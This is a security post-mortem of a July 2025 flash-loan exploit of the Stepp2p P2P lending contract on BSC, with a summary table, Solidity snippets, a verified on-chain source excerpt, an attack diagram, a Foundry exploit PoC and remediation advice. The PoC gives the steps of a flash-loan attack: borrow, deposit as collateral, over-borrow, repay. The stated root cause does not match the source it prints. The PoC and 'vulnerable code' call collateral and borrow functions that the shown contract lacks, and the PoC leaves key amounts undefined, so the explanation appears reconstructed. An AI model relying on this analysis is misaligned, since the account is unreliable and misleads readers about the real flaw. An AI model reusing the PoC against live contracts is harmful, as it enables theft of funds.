# Stepp2p — Flash Loan Business Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-17 |
| **Protocol** | Stepp2p |
| **Chain** | BSC |
| **Loss** | ~43,000 USD |
| **Attacker** | [0xd7235d08a48cbd3f63b9faa16130f2fdb50b2341](https://bscscan.com/address/0xd7235d08a48cbd3f63b9faa16130f2fdb50b2341) |
| **Attack Tx** | [0xe94752783](https://bscscan.com/tx/0xe94752783519da14315d47cde34da55496c39546813ef4624c94825e2d69c6a8) |
| **Vulnerable Contract** | [0x99855380e5f48db0a6babeae312b80885a816dce](https://bscscan.com/address/0x99855380e5f48db0a6babeae312b80885a816dce) |
| **Root Cause** | The collateral validation logic in the P2P lending contract is based on instantaneous balance, allowing bypass by providing temporary collateral within a single transaction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/Stepp2p_exp.sol) |

---

## 1. Vulnerability Overview

Stepp2p is a P2P-based lending protocol that provides loans collateralized by BSC-USD (USDT). The attacker borrowed BSC-USD via a PancakeSwap V3 flash loan, deposited it as collateral into the Stepp2p contract, and exploited a timing gap in the collateral validation to borrow more than the actual collateral value.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: collateral validation implemented in a way bypassable via flash loan
contract Stepp2p {
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public borrowed;

    function depositCollateral(uint256 amount) external {
        IERC20(BSC_USD).transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        // Collateral from flash loan is present at validation time — check passes
        require(collateral[msg.sender] >= amount * MIN_COLLATERAL_RATIO / 1e18, "Insufficient collateral");
        borrowed[msg.sender] += amount;
        IERC20(BSC_USD).transfer(msg.sender, amount);
        // Even if collateral is withdrawn within the same transaction, borrowed remains
    }
}

// ✅ Fix: collateral lock period and flash loan defense
function depositCollateral(uint256 amount) external {
    IERC20(BSC_USD).transferFrom(msg.sender, address(this), amount);
    collateral[msg.sender] += amount;
    collateralLockedUntil[msg.sender] = block.number + LOCK_BLOCKS;
}

function withdrawCollateral(uint256 amount) external {
    require(block.number >= collateralLockedUntil[msg.sender], "Collateral locked");
    require(collateral[msg.sender] - amount >= borrowed[msg.sender] * MIN_COLLATERAL_RATIO / 1e18);
    collateral[msg.sender] -= amount;
    IERC20(BSC_USD).transfer(msg.sender, amount);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: contracts/Stepp2p.sol
function setSellFee(uint256 _sellFee) external onlyOwner {
        sellFee = _sellFee;
    }
    function setBuyFee(uint256 _buyFee) external onlyOwner {
        buyFee = _buyFee;
    }
    function setFeeAccount(address _feeAccount) external onlyOwner {
        feeAccount = _feeAccount;
    }
    function createSaleOrder(
        uint256 _amount
    ) external nonReentrant returns (uint256) {
        require(_amount > 0, "Amount must be greater than 0");
        lastSaleId++;

        USDT.safeTransferFrom(msg.sender, address(this), _amount);

        uint256 feeAmount = sellFee > 0 ? (_amount * sellFee) / 1000 : 0;
        uint256 saleAmount = _amount - feeAmount;

        if (feeAmount > 0) {
            USDT.safeTransfer(feeAccount, feeAmount);
        }

        sales[lastSaleId] = Sale({
            seller: msg.sender,
            totalAmount: _amount,
            remaining: saleAmount,
            receivedFee: feeAmount,
            sellFee: sellFee,
            active: true
        });

        sellerSales[msg.sender].push(lastSaleId);
        lastSellerSaleId[msg.sender] = lastSaleId;

        emit SaleRegistered(lastSaleId, msg.sender, saleAmount);

        return lastSaleId;
    }
    function modifySaleOrder(
        uint256 _saleId,
        uint256 _modifyAmount,
        bool isPositive // true: add, false: sub
    ) external nonReentrant {
        require(_modifyAmount > 0, "Amount must be greater than 0");
        require(sales[_saleId].seller == msg.sender);

        uint256 feeAmount = sellFee > 0 ? (_modifyAmount * sellFee) / 1000 : 0;

        if (isPositive) {
            sales[_saleId].totalAmount += _modifyAmount;
            if (feeAmount > 0 && sales[_saleId].receivedFee > 0) {
                _modifyAmount -= feeAmount;
                sales[_saleId].receivedFee += feeAmount;
                USDT.safeTransfer(feeAccount, feeAmount);
            }
            sales[_saleId].remaining += _modifyAmount;
            USDT.safeTransferFrom(msg.sender, address(this), _modifyAmount);
        } else {
            require(
                sales[_saleId].remaining >= _modifyAmount,
                "Insufficient balance"
            );
            sales[_saleId].totalAmount -= _modifyAmount;
            sales[_saleId].remaining -= _modifyAmount;
            if (feeAmount > 0 && sales[_saleId].receivedFee > 0) {
                sales[_saleId].receivedFee -= feeAmount;
                USDT.safeTransferFrom(
                    feeAccount,
                    sales[_saleId].seller,
                    feeAmount
                );
            }
            USDT.safeTransfer(msg.sender, _modifyAmount);
        }

        emit SaleModifyed(
            _saleId,
            msg.sender,
            sales[_saleId].totalAmount,
            sales[_saleId].remaining
        );
    }

// ... (lines 145-338 omitted) ...

    function getRemainingSelectedAmount(
        uint256[] calldata saleIds
    ) external view returns (uint256 totalRemaining) {
        for (uint256 i = 0; i < saleIds.length; i++) {
            Sale storage sale = sales[saleIds[i]];
            if (sale.active) {
                totalRemaining += sale.remaining;
            }
        }
    }
    function emergencyWithdraw() external onlyOwner {
        uint256 amount = USDT.balanceOf(address(this));
        USDT.safeTransfer(owner(), amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap V3 (USDC/USDT): flash(BSC-USD)
  │         [callback entry]
  │
  ├─2─▶ Stepp2p.depositCollateral(large BSC-USD amount)
  │         └─ collateral ratio satisfied
  │
  ├─3─▶ Stepp2p.borrow(excessive amount)
  │         └─ LTV check passes with flash loan collateral → loan executed
  │
  ├─4─▶ Withdraw collateral from Stepp2p (or collateral remains after flash loan repayment)
  │         └─ loan balance retained, collateral returned
  │
  └─5─▶ PancakeSwap V3: repay flash loan + retain loan proceeds as profit
```

## 4. PoC Code (Core Logic + English Comments)

```solidity
contract Stepp2p is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 54653987 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = BSC_USD;
    }

    function testExploit() public balanceLog {
        // Initiate PancakeSwap V3 flash loan
        IPancakeV3Pool(PANCAKE_V3_USDC_USDT).flash(
            address(this), 0, flashAmount, ""
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // Deposit flash-loaned BSC-USD as collateral
        IERC20(BSC_USD).approve(STEPP2P, type(uint256).max);
        IStepp2p(STEPP2P).depositCollateral(flashAmount);

        // Execute over-borrowing while collateral is present
        IStepp2p(STEPP2P).borrow(borrowAmount);

        // Withdraw collateral (or retain collateral and keep only the loan)
        // IStepp2p(STEPP2P).withdrawCollateral(flashAmount);

        // Repay flash loan
        IERC20(BSC_USD).transfer(PANCAKE_V3_USDC_USDT, flashAmount + fee1);
        // Loan proceeds remain in attacker's balance
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing collateral lock period (flash loan collateral allowed via deposit + borrow + repay within a single transaction) |
| **Attack Vector** | Instantaneous collateral satisfaction via flash loan |
| **Impact Scope** | Entire P2P lending pool (~43,000 USD) |
| **CWE** | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Collateral Lock Period**: Prohibit withdrawal and borrowing for a minimum of N blocks after collateral deposit
2. **Flash Loan Detection**: Block the pattern of collateral deposit + borrow + collateral withdrawal within the same transaction
3. **Continuous Collateral Validation**: Periodically re-validate the collateral ratio throughout the loan duration
4. **Minimum Holding Period**: Require collateral to exist for N or more blocks before borrowing is permitted

## 7. Lessons Learned

- In P2P lending protocols, if collateral and borrowing can be handled within the same transaction, a flash loan can create instantaneous collateral and obtain a loan without any repayment obligation.
- "Appearing to have collateral" and "actually maintaining collateral" are different things — block-level locking is required.
- When designing DeFi lending protocols, flash loan scenarios must be explicitly included in the threat model.